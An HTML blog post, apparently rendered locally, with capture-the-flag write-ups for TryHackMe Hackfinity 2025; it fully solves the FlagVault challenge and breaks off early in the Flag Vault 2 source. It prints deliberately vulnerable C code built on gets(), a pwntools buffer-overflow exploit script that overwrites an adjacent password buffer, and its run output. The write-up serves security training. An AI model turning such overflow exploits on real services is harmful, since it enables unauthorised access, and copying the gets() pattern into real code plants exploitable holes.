@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Ctf Thm Hackfinity 2025 :: yocvito website</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Some write-ups for the THM Hackfinity 2025 CTF" />
+<meta name="keywords" content=", " />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/ctf-thm-hackfinity-2025/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/style.min.1cdbb7cf76923868c5b397f2052baabd091aedcc09ffebdd5da68e6d56712689.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.dc41063add420c2d2107bf5328b2f5abe23fb57e24dbc4fa9e7827b9f5bd8f9a.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Ctf Thm Hackfinity 2025">
+<meta property="og:description" content="Some write-ups for the THM Hackfinity 2025 CTF" />
+<meta property="og:url" content="//localhost:1313/posts/ctf-thm-hackfinity-2025/" />
+<meta property="og:site_name" content="yocvito website" />
+
+  
+  
+  <meta property="og:image" content="//localhost:1313/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-03-20 21:20:24 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    yocvito
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/about">About</a></li>
+        
+      
+        
+          <li><a href="/posts">Blog</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+        
+          <li><a href="/about/resume">Resume / CV</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/about" >About</a></li>
+        
+      
+        
+          <li><a href="/posts" >Blog</a></li>
+        
+      
+        
+          <li><a href="/projects" >Projects</a></li>
+        
+      
+        
+          <li><a href="/about/resume" >Resume / CV</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/ctf-thm-hackfinity-2025/">Ctf Thm Hackfinity 2025</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-03-20</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/write-up/">write-up</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/htm-hackfinity-2025/">HTM-hackfinity-2025</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/re/">re</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/pwn/">pwn</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/pentest/">pentest</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+         <div class="custom-toc">
+   <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn---flagvault">PWN - FlagVault</a>
+      <ul>
+        <li><a href="#enumeration">Enumeration</a></li>
+        <li><a href="#analysis">Analysis</a>
+          <ul>
+            <li><a href="#source-code">Source code</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploitation">Exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn---flag-vault-2">PWN - Flag Vault 2</a>
+      <ul>
+        <li><a href="#basic-enumeration">Basic Enumeration</a></li>
+        <li><a href="#analysis-1">Analysis</a>
+          <ul>
+            <li><a href="#source-code-1">Source code</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#pwn---voidexec">PWN - VoidExec</a></li>
+  </ul>
+</nav>
+ </div>
+
+
+<h2 id="pwn---flagvault">PWN - FlagVault<a href="#pwn---flagvault" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>This challenge is about exploitation a flag vault manager app running on a remote host on port <strong>1337</strong> (this is hinited in challenge description).</p>
+<p>We have access directly to the source code which will simplify the reverse engineering part (even though code is not obfuscated and pretty small, making reversing the binary equivalent)</p>
+<h3 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>We connect to the service (if you see <code>localhost</code> its because im running it locally)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ socat tcp:localhost:1337 -
+</span></span><span style="display:flex;"><span>  ______ _          __      __         _ _   
+</span></span><span style="display:flex;"><span> |  ____| |         <span style="color:#ae81ff">\ \ </span>   / /        | | |  
+</span></span><span style="display:flex;"><span> | |__  | | __ _  __ <span style="color:#ae81ff">\ \ </span> / /_ _ _   _| | |_ 
+</span></span><span style="display:flex;"><span> |  __| | |/ _<span style="color:#e6db74">`</span> |/ _<span style="color:#e6db74">`</span> <span style="color:#ae81ff">\ \/</span> / _<span style="color:#e6db74">`</span> | | | | | __|
+</span></span><span style="display:flex;"><span> | |    | | <span style="color:#f92672">(</span>_| | <span style="color:#f92672">(</span>_| |<span style="color:#ae81ff">\ </span> / <span style="color:#f92672">(</span>_| | |_| | | |_ 
+</span></span><span style="display:flex;"><span> |_|    |_|<span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>_, | <span style="color:#ae81ff">\/</span> <span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>_,_|_|<span style="color:#ae81ff">\_</span>_|
+</span></span><span style="display:flex;"><span>                  __/ |                      
+</span></span><span style="display:flex;"><span>                 |___/                       
+</span></span><span style="display:flex;"><span>                                             
+</span></span><span style="display:flex;"><span>Version 1.0 - Passwordless authentication evolved!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username: toto
+</span></span><span style="display:flex;"><span>Wrong password! No flag <span style="color:#66d9ef">for</span> you.
+</span></span></code></pre></div><p>We get kicked at as we enter a wrong username. Even though we see a <code>&quot;Wrong password&quot;</code> message, this is the default as we can test other usernames which all leads to the same error message.</p>
+<h3 id="analysis">Analysis<a href="#analysis" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<h4 id="source-code">Source code<a href="#source-code" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_banner</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;  ______ _          __      __         _ _   </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span> 		<span style="color:#e6db74">&#34; |  ____| |         </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">    / /        | | |  </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34; | |__  | | __ _  __ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  / /_ _ _   _| | |_ </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34; |  __| | |/ _` |/ _` </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/ / _` | | | | | __|</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34; | |    | | (_| | (_| |</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  / (_| | |_| | | |_ </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34; |_|    |_|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">__,_|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">__, | </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">__,_|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">__,_|_|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">__|</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;                  __/ |                      </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;                 |___/                       </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;                                             </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;Version 1.0 - Passwordless authentication evolved!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;==================================================================</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	     );
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_flag</span>(){
+</span></span><span style="display:flex;"><span>	FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">200</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fgets</span>(flag, <span style="color:#ae81ff">199</span>, f);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, flag);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">login</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> username[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> password[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Username: &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">gets</span>(username);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// If I disable the password, nobody will get in.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">//printf(&#34;Password: &#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">//gets(password);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(username, <span style="color:#e6db74">&#34;bytereaper&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(password, <span style="color:#e6db74">&#34;5up3rP4zz123Byte&#34;</span>)){
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">print_flag</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Wrong password! No flag for you.&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setvbuf</span>(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setvbuf</span>(stderr, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Start login process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">print_banner</span>();
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">login</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>main</code> will disable buffering for standard IOs (this is classical in CTFs and should not be looked up too much). Then it calls a function that prints a banner (the one we saw in enum) and finally enter the <code>login</code> function.</p>
+<p>In the later, we see that the programs allocates a <code>username</code> and <code>password</code> buffer of both <strong>100</strong> characters, then proceed to request the username from the user but deliberately supressed the password retrieving part so he think we could not enter a valid password. Then it compares inputs against hardcoded values.</p>
+<p>But our dear programmer forgets about how <code>gets</code> works. That&rsquo;s pretty sad for him as a warning message is typically displayed when you try to compile code using this function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gcc using-gets.c -o using-gets
+</span></span><span style="display:flex;"><span>using-gets.c: In <span style="color:#66d9ef">function</span> ‘login’:
+</span></span><span style="display:flex;"><span>using-gets.c:32:2: warning: implicit declaration of <span style="color:#66d9ef">function</span> ‘gets’; did you mean ‘fgets’? <span style="color:#f92672">[</span>-Wimplicit-function-declaration<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">32</span> |  gets<span style="color:#f92672">(</span>username<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>      |  ^~~~
+</span></span><span style="display:flex;"><span>      |  fgets
+</span></span><span style="display:flex;"><span>/usr/bin/ld: /tmp/ccX8oo5n.o: in <span style="color:#66d9ef">function</span> <span style="color:#e6db74">`</span>login<span style="color:#e6db74">&#39;:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">using-gets.c:(.text+0x1cd): warning: the `gets&#39;</span> <span style="color:#66d9ef">function</span> is dangerous and should not be used.
+</span></span></code></pre></div><p>Looking at the documentation of <code>gets</code>, we clearly understand why it should not be used:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ man gets
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>DESCRIPTION
+</span></span><span style="display:flex;"><span>       Never use this <span style="color:#66d9ef">function</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       gets<span style="color:#f92672">()</span>  reads  a  line  from stdin into the buffer pointed to by s <span style="color:#66d9ef">until</span> either a terminating newline or EOF,
+</span></span><span style="display:flex;"><span>       which it replaces with a null byte <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;\0&#39;</span><span style="color:#f92672">)</span>.  No check <span style="color:#66d9ef">for</span> buffer overrun is performed <span style="color:#f92672">(</span>see BUGS below<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>BUGS
+</span></span><span style="display:flex;"><span>       Never use gets<span style="color:#f92672">()</span>.  Because it is impossible to tell without knowing the data in advance how  many  characters
+</span></span><span style="display:flex;"><span>       gets<span style="color:#f92672">()</span>  will read, and because gets<span style="color:#f92672">()</span> will <span style="color:#66d9ef">continue</span> to store characters past the end of the buffer, it is ex‐
+</span></span><span style="display:flex;"><span>       tremely dangerous to use.  It has been used to break computer security.  Use fgets<span style="color:#f92672">()</span> instead.
+</span></span></code></pre></div><p>This means that every buffer of a certain length which is passed to <code>gets</code> can be overflowed (meaning we write more bytes than the buffer can hold, and override the memory next to the buffer)</p>
+<p>Going back to the source code we understand that even if we can&rsquo;t enter a password, the buffer overflow on the <code>username</code> variable allow us to override the <code>password</code> memory, and eventually supply the right password so that <code>print_flag</code> get called.</p>
+<h3 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>First of all, we need to compile the binary to inspect how memory layout of the stack variables would typically look likes. This is needed because the compiler can decide to add space between our stack variables (padding), meaning the source offsets aren&rsquo;t valid when running the binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gcc source.c -o source
+</span></span></code></pre></div><p>Then we open the binary in any disassembler (I use IDA). Then we look at the <code>login</code> function disassembly:</p>
+<p><img alt="Login function disassembly" src="/img/thm-hackfinity-2025/login-function.png"></p>
+<p>The program is likely compiled for <strong>x86_64</strong> architecture (but this is fully a guess and there is no acual way to know that from the running service). Thus, we know it likely uses System-V ABI calling convention where arguments are first passed into registers (1st arg in <code>rdi</code>, 1nd in <code>rsi</code>, etc&hellip; look at <a href="https://wiki.osdev.org/System_V_ABI#x86-64">this ressource</a>).</p>
+<p>By analyzing the argument setup for the two <code>strcmp</code> calls, we notice the input argument address in the <code>rdi</code> registers (<code>[rbp+var_E0]</code> and <code>[rbp+var_70]</code>). These are stack variables and that&rsquo;s why they are indexed from <code>rbp</code>, so to know the actual offset from the start of our first input at <code>rbp-0xE0</code> (<code>-</code> because stack grows backward, from high to low addresses), to the password buffer at <code>rbp-0x70</code>, we just substract them (giving an offset of 112 bytes).</p>
+<p>Now we know everything we need to exploit this binary, we will craft the exploit code that write the username in its right location (making sure to append an <code>\0</code> so <code>strcmp</code> doesn&rsquo;t read all our input), overflow username so we can put the password at the right location.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;ip&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>ip, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;bytereaper</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;P&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">112</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5up3rP4zz123Byte</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>))
+</span></span></code></pre></div><p>And running it gives us the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 exploit.py 10.10.211.12
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 10.10.211.12 on port 1337: Done
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;  ______ _          __      __         _ _   \n |  ____| |         \\ \\    / /        | | |  \n | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n                  __/ |                      \n                 |___/                       \n                                             \nVersion 1.0 - Passwordless authentication evolved!\n==================================================================\n&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Receiving all data: Done <span style="color:#f92672">(</span>34B<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed connection to 10.10.211.12 port <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;\nUsername: THM{XXX}\n&#39;</span>
+</span></span></code></pre></div><h2 id="pwn---flag-vault-2">PWN - Flag Vault 2<a href="#pwn---flag-vault-2" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>We need to exploit this flag vault manager app again !</p>
+<p>We have the same kind of information as earlier.</p>
+<h3 id="basic-enumeration">Basic Enumeration<a href="#basic-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Upon connection, we are still prompted for username as earlier, but we notice a special message
+in the banner hinting that the program should not print the flag anymore.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ socat tcp:localhost:1337 - 
+</span></span><span style="display:flex;"><span>  ______ _          __      __         _ _   
+</span></span><span style="display:flex;"><span> |  ____| |         <span style="color:#ae81ff">\ \ </span>   / /        | | |  
+</span></span><span style="display:flex;"><span> | |__  | | __ _  __ <span style="color:#ae81ff">\ \ </span> / /_ _ _   _| | |_ 
+</span></span><span style="display:flex;"><span> |  __| | |/ _<span style="color:#e6db74">`</span> |/ _<span style="color:#e6db74">`</span> <span style="color:#ae81ff">\ \/</span> / _<span style="color:#e6db74">`</span> | | | | | __|
+</span></span><span style="display:flex;"><span> | |    | | <span style="color:#f92672">(</span>_| | <span style="color:#f92672">(</span>_| |<span style="color:#ae81ff">\ </span> / <span style="color:#f92672">(</span>_| | |_| | | |_ 
+</span></span><span style="display:flex;"><span> |_|    |_|<span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>_, | <span style="color:#ae81ff">\/</span> <span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>_,_|_|<span style="color:#ae81ff">\_</span>_|
+</span></span><span style="display:flex;"><span>                  __/ |                      
+</span></span><span style="display:flex;"><span>                 |___/                       
+</span></span><span style="display:flex;"><span>                                             
+</span></span><span style="display:flex;"><span>Version 2.1 - Fixed print_flag to not print the flag. Nothing you can <span style="color:#66d9ef">do</span> about it!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Username: 
+</span></span></code></pre></div><h3 id="analysis-1">Analysis<a href="#analysis-1" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<h4 id="source-code-1">Source code<a href="#source-code-1" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_banner</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;  ______ _          __      __         _ _   </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span> 		<span style="color:#e6db74">&#34; |  ____| |         </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">    / /        | | |  </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
